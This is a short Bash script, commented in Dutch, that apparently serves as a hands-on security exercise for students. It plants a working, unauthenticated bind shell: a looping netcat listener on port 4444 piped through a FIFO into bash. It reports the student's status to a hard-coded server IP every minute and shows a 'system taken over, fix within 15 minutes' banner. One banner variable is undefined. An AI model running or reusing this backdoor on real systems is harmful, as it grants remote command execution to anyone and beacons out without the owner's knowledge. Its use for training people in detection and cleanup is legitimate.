#!/bin/bash

SERVER_IP="148.100.79.193"  # <- Vervang dit door het IP van je Flask-server
STUDENT_NAAM="$1"
PORT=4444
FIFO="/tmp/.fifo_$PORT"
CALLBACK_PORT=5000

# Zorg dat er geen oude sessies/pipe bestaan
pkill -f "nc -lvnp $PORT"
rm -f "$FIFO"
mkfifo "$FIFO"

# Start de shell-listener in loop
(
  while true; do
    echo "[*] Wacht op verbinding op poort $PORT..."
    cat "$FIFO" | nc -lvnp "$PORT" > "$FIFO"
  done
) &

# Start bash die input van FIFO leest
(
  while true; do
    bash < "$FIFO" > "$FIFO" 2>&1
  done
) &


# Eerste registratie naar monitoringserver
curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
  -d "student=$STUDENT_NAAM&status=vulnerable" &>/dev/null

# Toon ASCII-banner
echo -e "\n\033[1;31m
██╗░░██╗███████╗██╗░░░██╗███████╗██╗░░██╗██████╗░
██║░░██║██╔════╝╚██╗░██╔╝██╔════╝██║░░██║██╔══██╗
███████║█████╗░░░╚████╔╝░█████╗░░███████║██████╔╝
██╔══██║██╔══╝░░░░╚██╔╝░░██╔══╝░░██╔══██║██╔═══╝░
██║░░██║███████╗░░░██║░░░███████╗██║░░██║██║░░░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░

\033[0mJe systeem is overgenomen. Poort $LISTENER_PORT staat open.
Herstel dit voordat de 15 minuten om zijn!
" | tee /tmp/hacked_banner.txt

# Status reporter (elke 60 sec update naar server)
status_reporter() {
  while true; do
    if pgrep -f "nc -lvnp $PORT" > /dev/null; then
      STATUS="vulnerable"
    else
      STATUS="secure"
    fi

    curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
      -d "student=$STUDENT_NAAM&status=$STATUS" >/dev/null 2>&1

    sleep 60
  done
}

status_reporter &
